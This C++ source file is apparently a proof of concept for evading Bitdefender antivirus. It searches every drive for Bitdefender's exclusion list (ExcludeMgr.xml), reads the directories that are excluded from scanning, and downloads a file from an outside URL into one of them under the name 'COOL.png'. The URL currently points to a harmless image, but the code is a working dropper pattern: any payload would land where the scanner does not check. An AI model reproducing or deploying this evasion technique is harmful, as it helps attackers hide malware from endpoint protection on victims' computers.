//#include <iostream>
#include <string>
#include <fstream>
#include <filesystem>
#include <vector>
#include <urlmon.h>
#pragma comment(lib, "urlmon.lib")

void DownloadFile(std::string url, std::string saveLoc, std::string fileName)
{
	saveLoc += "\\" + fileName;
	HRESULT hr;
	LPCTSTR downFrom = url.c_str();
	LPCTSTR downTo = saveLoc.c_str();
	hr = URLDownloadToFile(0, downFrom, downTo, 0, 0);	
}

void EnumerateDrives(std::string &fileLoc, std::ifstream &filestream) {
	char drive;

	// Iterate through all drives (A-Z):
	for (int i = 0; i < 26 || !filestream.is_open(); i++) {
		drive = i + 65; // +65 to get ASCII A-...
		fileLoc[0] = drive;
		std::ifstream filestream(fileLoc);
		if (filestream.is_open()) {
			filestream.open(fileLoc);
			break;
		}
	}
}

void FindExclusions(std::ifstream &filestream, std::vector<std::string> &exclusions) {
	std::string line;
	std::size_t found;

	if (filestream.is_open()) {
		// Iterate line by line:
		while (std::getline(filestream, line)) {
			// Only get lines with [var]:
			found = line.find("ExcludeItem");
			if (found != std::string::npos) {
				// Remove opening tag and everything before it:
				found = line.find(':');
				line.erase(0, found - 1);
				// Remove the closing tag and everything after it:
				found = line.find('<');
				line.erase(found, line.length());

				if (std::experimental::filesystem::is_directory(line)) {
					exclusions.push_back(line);
				}				
			}
		}
	}
}

int main() {
	std::string fileLoc = "A:\\Program Files\\Bitdefender\\Bitdefender Security\\settings\\system\\ExcludeMgr.xml";
	std::string fileName = "COOL.png";
	std::ifstream excludeMgr;
	std::vector<std::string> exclusions;

	EnumerateDrives(fileLoc, excludeMgr);

	excludeMgr.open(fileLoc); // Re-open the file because of scope... yay :/
	FindExclusions(excludeMgr, exclusions);

	// Try to download the file to the excluded location, if it doesn't work try another location:
	for (auto i : exclusions) {
		DownloadFile("http://en.pickture.com/static/img/og_pickture_logo.png", i, fileName);
		if (std::experimental::filesystem::exists(i + "\\" + fileName)) {
			break;
		}
		else {
			continue;
		}
	}
	return 0;
}

/*

DOWNLOADFILE():
std::cout << downFrom << " TO " << downTo << std::endl;
	switch (hr)
	{
	case S_OK:
		std::cout << "Successful download\n";
		break;
	case E_OUTOFMEMORY:
		std::cout << "Out of memory error\n";
		break;
	case INET_E_DOWNLOAD_FAILURE:
		std::cout << "Cannot access server data\n";
		break;
	default:
		std::cout << "Unknown error\n";
		break;
	}
	printf("%x", hr);

*/